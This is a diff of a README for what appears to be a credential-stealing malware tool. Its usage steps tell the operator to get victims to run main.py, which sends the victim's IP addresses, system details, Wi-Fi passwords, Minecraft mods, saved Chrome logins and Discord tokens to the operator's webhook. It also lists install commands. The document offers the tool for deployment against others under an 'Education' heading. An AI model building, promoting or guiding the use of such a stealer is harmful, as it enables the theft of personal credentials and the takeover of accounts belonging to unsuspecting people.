@@ -14,21 +14,36 @@ HOW TO USE:
 5: tell them to run main.py, this will run the code and this content will be sent to your webhook:
 
 Operating system
+
 Public IP
+
 Computer Name
+
 Private IP
+
 Cores
+
 GPU
+
 general ip location (WONT BE EXACT IT WILL BE GENERAL LOCATION)
+
 Wifi passwords
+
 All mods in minecraft mods folder (all under 8mb)
+
 All saved chrome login details
+
 All discord tokens
 
 
+
+
 manual install steps for unix or mac based machines: 
+
 pip install requests
+
 pip install pycrypto
+
 --installing pywin32==304 wont work as it only installs on windows, the code will check the os and run parts of code accordingly--
 
 Education:
